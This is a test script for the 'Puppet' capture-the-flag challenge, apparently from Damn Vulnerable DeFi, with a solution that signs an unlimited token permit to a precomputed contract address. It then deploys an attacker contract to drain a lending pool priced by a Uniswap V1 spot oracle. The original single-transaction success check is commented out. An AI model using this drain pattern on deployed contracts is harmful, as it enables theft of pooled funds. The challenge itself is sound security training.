const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
const { ethers, BigNumber } = require("hardhat");
const { expect } = require("chai");
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
const rlp = require("rlp");
const keccak = require("keccak");

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(
  tokensSold,
  tokensInReserve,
  etherInReserve
) {
  return (
    (tokensSold * 997n * etherInReserve) /
    (tokensInReserve * 1000n + tokensSold * 997n)
  );
}

describe("[Challenge] Puppet", function () {
  let deployer, player;
  let token, exchangeTemplate, uniswapFactory, uniswapExchange, lendingPool;

  const UNISWAP_INITIAL_TOKEN_RESERVE = 10n * 10n ** 18n;
  const UNISWAP_INITIAL_ETH_RESERVE = 10n * 10n ** 18n;

  const PLAYER_INITIAL_TOKEN_BALANCE = 1000n * 10n ** 18n;
  const PLAYER_INITIAL_ETH_BALANCE = 25n * 10n ** 18n;

  const POOL_INITIAL_TOKEN_BALANCE = 100000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    const UniswapExchangeFactory = new ethers.ContractFactory(
      exchangeJson.abi,
      exchangeJson.evm.bytecode,
      deployer
    );
    const UniswapFactoryFactory = new ethers.ContractFactory(
      factoryJson.abi,
      factoryJson.evm.bytecode,
      deployer
    );

    setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
    expect(await ethers.provider.getBalance(player.address)).to.equal(
      PLAYER_INITIAL_ETH_BALANCE
    );

    // Deploy token to be traded in Uniswap
    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();

    // Deploy a exchange that will be used as the factory template
    exchangeTemplate = await UniswapExchangeFactory.deploy();

    // Deploy factory, initializing it with the address of the template exchange
    uniswapFactory = await UniswapFactoryFactory.deploy();
    await uniswapFactory.initializeFactory(exchangeTemplate.address);

    // Create a new exchange for the token, and retrieve the deployed exchange's address
    let tx = await uniswapFactory.createExchange(token.address, {
      gasLimit: 1e6
    });
    const { events } = await tx.wait();
    uniswapExchange = await UniswapExchangeFactory.attach(
      events[0].args.exchange
    );

    // Deploy the lending pool
    lendingPool = await (
      await ethers.getContractFactory("PuppetPool", deployer)
    ).deploy(token.address, uniswapExchange.address);

    // Add initial token and ETH liquidity to the pool
    await token.approve(uniswapExchange.address, UNISWAP_INITIAL_TOKEN_RESERVE);
    await uniswapExchange.addLiquidity(
      0, // min_liquidity
      UNISWAP_INITIAL_TOKEN_RESERVE,
      (await ethers.provider.getBlock("latest")).timestamp * 2, // deadline
      { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
    );

    // Ensure Uniswap exchange is working as expected
    expect(
      await uniswapExchange.getTokenToEthInputPrice(10n ** 18n, {
        gasLimit: 1e6
      })
    ).to.be.eq(
      calculateTokenToEthInputPrice(
        10n ** 18n,
        UNISWAP_INITIAL_TOKEN_RESERVE,
        UNISWAP_INITIAL_ETH_RESERVE
      )
    );

    // Setup initial token balances of pool and player accounts
    await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
    await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

    // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
    expect(await lendingPool.calculateDepositRequired(10n ** 18n)).to.be.eq(
      2n * 10n ** 18n
    );

    expect(
      await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
    ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE * 2n);
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */

    let attacker_factory = await ethers.getContractFactory(
      "Attacker_puppet",
      player
    );

    // set token value and deadline
    const _value = ethers.constants.MaxUint256.toString();
    let timestamp = Math.floor(Date.now() / 1000);
    const deadline = (timestamp + 4200).toString();

    // get the current nonce for the deployer address
    const nonces = (await token.nonces(player.address)).toString();

    // Get the chainID
    const chainId = hre.network.config.chainId;
    // set the domain parameters
    const domain = {
      name: await token.name(),
      version: "1",
      chainId: chainId,
      verifyingContract: token.address
    };
    console.log(nonces);
    console.log(player.address.toString());

    let nonceToNumber = parseInt(nonces);
    const encodedData = rlp.encode([
      player.address, // address from which contract is to be deployed
      ethers.utils.hexlify(nonceToNumber + 1) // hex encoded nonce of address that will be used for contract deployment.nonce =  actual nonce + 1
    ]);

    const contractAddress = `0x${keccak("keccak256")
      .update(encodedData)
      .digest("hex")
      .substring(24)}`;
    console.log({ contractAddress });

    let futureAttackerContract = contractAddress.toString();
    // "0x71C95911E9a5D330f4D621842EC243EE1343292e";

    console.log("future contract", futureAttackerContract);
    // set the Permit type parameters
    const types = {
      Permit: [
        {
          name: "owner",
          type: "address"
        },
        {
          name: "spender",
          type: "address"
        },
        {
          name: "value",
          type: "uint256"
        },
        {
          name: "nonce",
          type: "uint256"
        },
        {
          name: "deadline",
          type: "uint256"
        }
      ]
    };

    // set the Permit type values
    const values = {
      owner: player.address,
      spender: futureAttackerContract,
      value: _value,
      nonce: nonces,
      deadline: deadline
    };

    console.log(player.address);
    console.log(futureAttackerContract);
    console.log(_value);
    console.log(nonces);
    console.log(deadline);
    // sign the Permit type data with the deployer's private key
    const signature = await player._signTypedData(domain, types, values);

    // // split the signature into its components
    const sig = ethers.utils.splitSignature(signature);

    // // verify the Permit type data with the signature
    const recovered = ethers.utils.verifyTypedData(domain, types, values, sig);

    // permit the tokenReceiver address to spend tokens on behalf of the tokenOwner
    let tx = await token
      .connect(player)
      .permit(
        player.address,
        futureAttackerContract,
        _value,
        deadline,
        sig.v,
        sig.r,
        sig.s
      );

    let attacker = await attacker_factory.deploy(
      token.address,
      uniswapExchange.address,
      lendingPool.address,
      { value: ethers.utils.parseEther("20") }
    );

    console.log("accutal contract", attacker.address);
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    // Player executed a single transaction
    // expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);

    // Player has taken all tokens from the pool
    expect(await token.balanceOf(lendingPool.address)).to.be.eq(
      0,
      "Pool still has tokens"
    );

    expect(await token.balanceOf(player.address)).to.be.gte(
      POOL_INITIAL_TOKEN_BALANCE,
      "Not enough token balance in player"
    );
  });
});
